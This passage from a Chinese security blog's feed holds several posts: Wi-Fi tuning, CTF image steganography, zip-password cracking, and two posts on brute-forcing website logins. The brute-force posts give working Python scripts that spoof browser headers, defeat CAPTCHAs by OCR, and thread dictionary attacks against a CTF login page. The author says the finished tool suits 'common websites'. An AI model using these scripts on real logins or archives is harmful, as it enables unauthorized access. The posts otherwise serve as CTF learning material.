设置合适的频带宽度</h2><p>常见的路由器可设置的频带宽度为20Mhz和40Mhz，显而易见，40Mhz肯定比20Mhz传输道路宽，所以传输速度快。但是在路由器密集的地方，频带宽度大也就意味着容易和别人的信号起冲突。<br>就像公路的总宽度是一定的，如果没有冲突，用更宽的卡车（40Mhz）明显运送货物（数据）更快，但是车多了，容易拥堵，大家还都用卡车的话，肯定是不如都开小汽车（20Mhz）来的快。<br>所以我对频带宽度选择的建议是，如果在路由器稀疏的地方，就用40Mhz，在路由器密集的地方，就用20Mhz。  </p><h2 id="0x04-使用5-0Ghz频段（附）"><a href="#0x04-使用5-0Ghz频段（附）" class="headerlink" title="0x04 使用5.0Ghz频段（附）"></a>0x04 使用5.0Ghz频段（附）</h2><p>5Ghz信号的波长要比2.4Ghz信号的要短，而波长越短的电磁波穿透力就越强。但因为频率越高消耗在穿透上的能量越大，导致信号浪费，设备接受到的反而是反射衍射过来的信号。2.4Ghz下，衍射和反射比5Ghz要多，因此设备接受到的信号反而强。<br>但是5Ghz比2.4Ghz要多出很多空闲的高频段，可以分为23个不重叠的20MHz频段。而且因为目前大部分用户的路由器都工作在2.4Ghz，所以5Ghz是一个很好的选择。<br>这里要注意的一点是，配置5Ghz需要路由器和接收设备的无线网卡都支持5Ghz，否则买到5Ghz的路由器之后，电脑或者手机无法接收也是没有用的。下面教大家几个查看自己电脑是否支持5.0Ghz的方法：  </p><ul><li>1 在设备管理器中查看自己的无线网卡型号，然后去网上搜是否支持5Ghz。</li><li>2 在网络属性的硬件属性中查看频段。</li><li>3 在cmd中输入netsh wlan show drivers，然后查看其中的支持的无线电类型，如果包含802.11a或802.11ac，则支持5Ghz。如博主的网卡，就不支持5Ghz。  </li></ul><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/wifi/4.png">   </p>]]></content>
    
    
    <categories>
      
      <category>无线网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>无线网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python爬虫暴力破解网站登陆密码（二）</title>
    <link href="/2017/09/01/python%E7%88%AC%E8%99%AB%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%BD%91%E7%AB%99%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2017/09/01/python%E7%88%AC%E8%99%AB%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%BD%91%E7%AB%99%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="python爬虫暴力破解网站登陆密码（二）"><a href="#python爬虫暴力破解网站登陆密码（二）" class="headerlink" title="python爬虫暴力破解网站登陆密码（二）"></a>python爬虫暴力破解网站登陆密码（二）</h1><p>上一篇主要介绍了一个基本的暴力破解爬虫的构成，但是他在实际使用的时候存在很多缺陷，比如速度很慢，遇到验证码无法进行等问题，这篇博客主要介绍验证码处理和多线程处理模块。  </p><h2 id="0x00-处理验证码"><a href="#0x00-处理验证码" class="headerlink" title="0x00 处理验证码"></a>0x00 处理验证码</h2><p>网站区别人类用户和爬虫还有一个最常用的方法，那就是验证码，验证码（CAPTCHA）全称是全自动区分计算机和人类的公开图灵测试。可以说验证码就是为了阻止脚本而被发明的。可是当某些网站的验证码比较清晰好识别的时候，我们就可以借助计算机光学识别实现了。对于复杂的验证码，可以使用一些验证码处理的api（绝大多数是付费的）这些接口会有人工处理，一般30秒之内就能返回结果。    </p><p>光学识别示例：  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> Tkinter <span class="hljs-keyword">import</span> *<br>tk= Tk()<br><span class="hljs-keyword">import</span> pytesseract<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>x=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):<br>    img = Image.<span class="hljs-keyword">open</span>(&quot;%s.png&quot; %x)<br>    gray = img.convert(<span class="hljs-string">&#x27;L&#x27;</span>)<br>    gray.save(<span class="hljs-string">&#x27;%s_1.png&#x27;</span> %x)<br>    bw = gray.point(lambda x: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">200</span> <span class="hljs-keyword">else</span> <span class="hljs-number">255</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    bw.save(<span class="hljs-string">&#x27;%s_2.png&#x27;</span> %x)<br>    img.<span class="hljs-keyword">show</span>()<br>    print(pytesseract.image_to_string(bw))<br>    x+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="0x01-多线程、多进程"><a href="#0x01-多线程、多进程" class="headerlink" title="0x01 多线程、多进程"></a>0x01 多线程、多进程</h2><p>在暴力破解中需要的时间本就十分漫长，如果字典过大仍然使用串行处理，时间会长到一个不可思议的程度，为了尽量减少花费的时间，我们采用多线程或者多进程并行处理的方式提升处理速度。这里我们采用多线程作为例子，因为python实现多线程十分方便。  </p><p>多线程原理：<br>同一时间内，CPU只能处理1条线程，只有1条线程在工作（执行）;多线程并发（同时）执行，其实是CPU快速地在多条线程之间调度（切换）。如果CPU调度线程的时间足够快，就造成了多线程并发执行的假象。  </p><p>多线程优缺点：  </p><ul><li>优点：大大提高运行效率。</li><li>缺点：开启线程需要占用一定的内存空间（默认情况下，主线程占用1M，子线程占用512KB），如果开启大量的线程，会占用大量的内存空间，降低程序的性能；线程越多，CPU在调度线程上的开销就越大。  </li></ul><p>多线程示例：  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><span class="hljs-keyword">from</span> threading import Thread<br><br>def boom():<br>    data = &#123;<span class="hljs-string">&#x27;pwd&#x27;</span>:password&#125;<br>    <span class="hljs-builtin-name">print</span> password<br>    content = requests.post(url,<span class="hljs-attribute">data</span>=data)<br>    content.<span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span><br>    <span class="hljs-attribute">html</span>=content.text<br>    <span class="hljs-keyword">if</span> html != recv:<br>        <span class="hljs-builtin-name">print</span> html<br><span class="hljs-comment">#dname = input(&quot;input dname:&quot;)</span><br><span class="hljs-attribute">url</span>=<span class="hljs-string">&#x27;http://120.24.86.145:8002/baopo/?yes&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;pwd&#x27;</span>:123&#125;<br><br>content = requests.post(url,<span class="hljs-attribute">data</span>=data)<br>content.<span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-attribute">recv</span>=content.text<br><br>passFile = open(r<span class="hljs-string">&#x27;C:\Users\Leticia\Desktop\mutou.txt&#x27;</span>)<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> passFile.readlines():<br>    password = line.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    t = Thread(<span class="hljs-attribute">target</span>=boom)<br>    t.start()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>python</tag>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python爬虫暴力破解网站登陆密码（一）</title>
    <link href="/2017/06/26/python%E7%88%AC%E8%99%AB%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%BD%91%E7%AB%99%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2017/06/26/python%E7%88%AC%E8%99%AB%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%BD%91%E7%AB%99%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="python爬虫暴力破解网站登陆密码（一）"><a href="#python爬虫暴力破解网站登陆密码（一）" class="headerlink" title="python爬虫暴力破解网站登陆密码（一）"></a>python爬虫暴力破解网站登陆密码（一）</h1><p>本来准备一次写完这篇博客，但是写出主干后发现有很多重要的东西没有提到，所以就分成两篇写，这篇写基础操作，下一篇加上验证码处理和多线程处理模块。  </p><h2 id="0x00-robot-txt"><a href="#0x00-robot-txt" class="headerlink" title="0x00 robot.txt"></a>0x00 robot.txt</h2><p>在写爬虫爬取某个网站之前，我们应该去了解这个网站的robot.txt。那什么是robot.txt呢？简单的说，就是网站的所有者为了让爬虫了解爬取该网站的时候存在哪些限制。虽然这些限制只是建议，但是如果你的爬虫不遵守这些限制，很容易会被网站所封禁。<br>下图为IBM官方网站的robot.txt，我们写爬虫的时候，应该尽量遵守规定。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/a.png">  </p><p>  下面给出几种写法示例：  </p><ol><li>允许所有的robot访问  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">User-agent: * </span><br><span class="hljs-section">Allow: / </span><br>或者<br><span class="hljs-section">User-agent: * </span><br><span class="hljs-section">Disallow:</span><br></code></pre></td></tr></table></figure></li><li>禁止所有搜索引擎访问网站的任何部分<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/<br></code></pre></td></tr></table></figure></li><li>仅禁止Baiduspider访问您的网站<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>Baiduspider<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/<br></code></pre></td></tr></table></figure></li><li>仅允许Baiduspider访问您的网站<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">User-agent: Baiduspider</span><br><span class="hljs-section">Disallow:</span><br></code></pre></td></tr></table></figure></li><li>禁止spider访问特定目录<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">User-agent: *<br>Disallow: <span class="hljs-regexp">/tmp/</span><br></code></pre></td></tr></table></figure>0x01 伪造header</li></ol><hr><p>网站防采集的前提就是要正确地区分人类访问用户和网络机器人，方法之一就是查看你的http请求头，我们为了让自己的爬虫看起来更像是人类用户，就需要对header进行伪造。<br>伪造header成什么样最好呢？当然是伪造成自己手动访问时候的样子最好。这里我们就能用到Firefox中的一个扩展工具——HttpFox（也可以用Chrome开发者模式直接查看），利用这个工具，我们能抓取我们用Firefox访问网站过程的数据包，然后查看这个数据包，就可以看到我们手动访问时的header，然后使用python的requests库进行伪造。<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/b.png">  </p><p>  代码中hea的部分就可以照着上图写成这种格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">hea = &#123; <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span> : <span class="hljs-string">&#x27;zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span><br>       &#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-填写data并登陆"><a href="#0x02-填写data并登陆" class="headerlink" title="0x02 填写data并登陆"></a>0x02 填写data并登陆</h2><p>既然要破解登陆密码，那前提肯定要做到登陆，我们手动登陆的时候当然是输入账号，输入密码，然后点击提交。可是爬虫工作时，看到的和我们不一样，这个时候账号密码应该怎么传入、登陆操作该怎么进行呢？这个时候再一次用到了Httpfox（同样可以用Chrome开发者模式直接查看），上次我们手动输入时，传入的数据在Httpfox中也被抓取了，照着他的样子填好data，然后我们使用requests中的post命令传入data获取一个cookie，然后再通过cookies访问下一个网站，就实现了爬虫的登陆。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/c.png">  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/d.png">  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/e.png"><br>如这个网站，两种方法都可以看到要传递的数据，那么填写的时候就要写成这种格式：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">data = &#123;<br>    <span class="hljs-string">&#x27;j_username&#x27;</span>: <span class="hljs-string">&#x27;xxxxxx&#x27;</span>,<br><span class="hljs-string">&#x27;j_password&#x27;</span>: <span class="hljs-string">&#x27;xxxxxx&#x27;</span>,<br><span class="hljs-string">&#x27;checkCode&#x27;</span>: <span class="hljs-string">&#x27;xxx&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>这里用一个ctf环境先做一个小脚本进行测试，这道题密码是五位纯数字，生成字典的方法之前破解压缩包的时候已经讲过不在赘述，代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br>hea = &#123; <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span> : <span class="hljs-string">&#x27;zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span><br>       &#125;<br>url=<span class="hljs-string">&#x27;http://120.24.86.145:8002/baopo/?yes&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;pwd&#x27;</span>:<span class="hljs-number">123</span>&#125;<br><br>content = requests.post(url,data=data,headers=hea)<br>content.encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span><br>recv=content.text<br><br>passFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\Users\Leticia\Desktop\mutou.txt&#x27;</span>)<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> passFile.readlines():<br>    password = line.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    data = &#123;<span class="hljs-string">&#x27;pwd&#x27;</span>:password&#125;<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;trying&#x27;</span>,password<br>    content = requests.post(url,data=data)<br>    content.encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span><br>    html=content.text<br>    <span class="hljs-keyword">if</span> html != recv:<br>        <span class="hljs-built_in">print</span> html<br></code></pre></td></tr></table></figure><p>结果如下：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/f.png"><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/g.png">  </p><p>这个脚本的雏形就有了，可以爆破出结果，但是还存在速度很慢，遇到验证码无法进行等问题，下一节再加上验证码处理和多线程处理的模块,解决了这几个问题，就可以用来处理常见的网站了。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>python</tag>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf中常见的隐写术</title>
    <link href="/2017/05/29/ctf%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    <url>/2017/05/29/ctf%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf中常见的隐写术"><a href="#ctf中常见的隐写术" class="headerlink" title="ctf中常见的隐写术"></a>ctf中常见的隐写术</h1><h2 id="0x01-什么是隐写术"><a href="#0x01-什么是隐写术" class="headerlink" title="0x01 什么是隐写术"></a>0x01 什么是隐写术</h2><p>隐写术是关于信息隐藏，即不让计划的接收者之外的任何人知道信息的传递事件（而不只是信息的内容）的一门技巧与科学。具体涉及到图片隐写，音频隐写，视频隐写。其中图片的隐写是最为常见的，也是ctf中常见的一种题型。<br>0x02 准备的工具</p><hr><ul><li>Notepad++，功能比 Windows 中的 Notepad(记事本)强大，除了可以用来制作一般的纯文字说明文件，也十分适合编写计算机程序代码。不仅有语法高亮度显示，也有语法折叠功能，并且支持宏以及扩充基本功能的外挂模组。主要是用来方便的查找一些东西。</li><li>binwalk，kali下的一个自动化分析图片隐藏文件的软件。用来自动分析图片隐藏信息及其所在位置。</li><li>Stegsolve，一款图片通道查看器。做LSB分析，图片比较什么的。</li><li>Winhex，16进制查看器。用通过分析2进制数据来看隐藏了什么，同时可以用来分离文件。</li><li>Photoshop，三大邪教之一。看看有没有隐藏的图层什么的。</li><li>Exif查看器，可以查看拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。  </li></ul><p>对于不想装linux系统，真的想在windows下安装binwalk的，也可以，先确保windows中有git环境和python环境，然后在git中输入</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/devttys0/binwalk<br><span class="hljs-keyword">cd</span> binwalk<br><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install<br></code></pre></td></tr></table></figure><p>Binwalk具体用法在wiki里面，没有git环境的在github项目里直接下载binwalk</p><p>  github项目：<a href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a></p><p>  binwalk的wiki：<a href="https://github.com/devttys0/binwalk/wiki">https://github.com/devttys0/binwalk/wiki</a><br>0x03 类型1</p><hr><p>用载体进行隐藏，查看一下属性，看看里面有没有什么信息，或者直接用notepad++打开，一般ctrl+f查找一下key，flag等信息，如果没找到，可以翻到图片头或者尾部查看是否有特殊的字符串，比如一段md5、base64、unicode之类的，然后到某些网址进行解密。</p><p>通过备注查看：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.0.png"><br>通过notepad++查看：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.1.png"><br>在线解密：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.2.png"><br>0x04 类型2</p><hr><p>图片文件会自动忽略结束符之后的数据，比如jpg图片的结束符为FF D9,在这之后加入数据，不会影响jpg的显示，对于类隐写，我们肯定用不能winhex打开16进制数据肉眼去看，这个时候就要用到binwalk了，例子如下，放在linux里，用binwalk xxx.jpg自动跑出来隐藏的信息及其类型。这个时候我们借助winhex设置头和尾然后导出成新文件，或者直接在linux系统中用dd命令，都是可以分割出来后面一段文件的。</p><p>  使用binwalk分析：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.1.png"><br>  在linux下用dd命令分离（方法一）：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.2.png"><br>  在win下用winhex分离（方法二）：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.3.png"><br>  分离出来的结果：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.4.png"><br>0x05 类型3</p><hr><p>LSB隐写，也就是最低有效位 (Least Significant Bit)。图片中的像数一般是由三种颜色组成，即三原色，由这三种原色可以组成其他各种颜色，例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit。<br>这里需要注意一个坑，很多时候它会给你一个黑白颜色相反的二维码，直接扫肯定是出不来结果的，需要自己处理一下，最简单的就是放到一个可以编辑的地方ctrl+a一下，然后扫描。</p><p>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/3.1.png"><br>使用Stegsolve发现他在灰色最低位隐藏了一个二维码：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/3.2.png"><br>0x06 类型4</p><hr><p>Gif，这种题喜欢让密码出现的特别快来不及记录，这个时候丢到Stegsolve-frame browser，一帧一帧的看就行了<br>逐帧查看：  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.1.png">  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.2.png">  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.3.png"><br>0x07 总结</p><hr><p>关于图片隐写的还有很多，png格式的文件经常会在一个不完整的版块藏很多数据，这个时候可以用pngcheck分析，有时候会跑出来两张看起来相同的png图片，可以丢到Stegsolve-image combiner中对比，bmp文件经常会在不同图层隐藏信息，photoshop就可以处理。例子中用到的图都放在github中了，有兴趣的朋友可以去试试。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python多线程暴力破解压缩包</title>
    <link href="/2017/05/15/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
    <url>/2017/05/15/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="python多线程暴力破解压缩包"><a href="#python多线程暴力破解压缩包" class="headerlink" title="python多线程暴力破解压缩包"></a>python多线程暴力破解压缩包</h1><p>网上下载下来别人共享的压缩包有时会有密码，而且多半是弱口令；有人经常会忘记自己的几位密码，只记得大概格式…遇到诸如此类情况的时候，你或许就需要一个暴力破解工具了。<br>0x01 基于python2.7的暴力破解脚本</p><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> optparse<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extractFile</span>(<span class="hljs-params">zipFile,password</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        zipFile.extractall(pwd=password)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;password is:&#x27;</span>+password + <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    parser = optparse.OptionParser()<br>    parser.add_option(<span class="hljs-string">&#x27;-f&#x27;</span>,dest=<span class="hljs-string">&#x27;zname&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;zipfile name&quot;</span>)<br>    parser.add_option(<span class="hljs-string">&#x27;-d&#x27;</span>,dest=<span class="hljs-string">&#x27;dname&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;dictionary name&quot;</span>)<br>    (options,args)= parser.parse_args()<br>    <span class="hljs-keyword">if</span>(options.zname==<span class="hljs-literal">None</span>)|(options.dname==<span class="hljs-literal">None</span>):<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;---wrong input!---&#x27;</span>+<span class="hljs-string">&#x27;\n&#x27;</span><br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">else</span>:<br>        zname = options.zname<br>        dname = options.dname<br>    zipFile = zipfile.ZipFile(zname)<br>    passFile = <span class="hljs-built_in">open</span>(dname)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> passFile.readlines():<br>        password = line.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = Thread(target=extractFile,args=(zipFile,password))<br>        t.start()<br><span class="hljs-keyword">if</span> __name__ ==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>代码如上，我们用到了三个库：  </p><ul><li>zipfile模块用来做zip格式编码的压缩和解压缩的，要解压zip文件当然需要用到这个库。</li><li>threading模块是用来创建线程的，我们为了加快破解速度要使用多线程。</li><li>optparse模块用来处理命令行参数，这样就不会出现每次需要改代码或者交到别人手中不会用的问题。</li></ul><p>我们在main函数中读取命令行传递过来的压缩文件名和字典文件名，用open命令读取字典，然后创建线程并在extractFile函数中尝试字典，密码正确则返回密码的值。<br>一些函数的具体用法  ：</p><ul><li><a href="http://blog.chinaunix.net/uid-27571599-id-3484048.html">python多线程模块threading详解</a>  </li><li><a href="http://www.cnblogs.com/captain_jack/archive/2011/01/11/1933366.html">python模块学习–optparse</a></li></ul><h2 id="0x02-制作字典"><a href="#0x02-制作字典" class="headerlink" title="0x02 制作字典"></a>0x02 制作字典</h2><p>首先，我们下载一个名为“木头超级字典工具集”的软件，这里可以生成各种各样类型的字典，可以选择密码包含的字符集以及设定已知的每一位，还有一些特殊的字典。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/01.jpg">  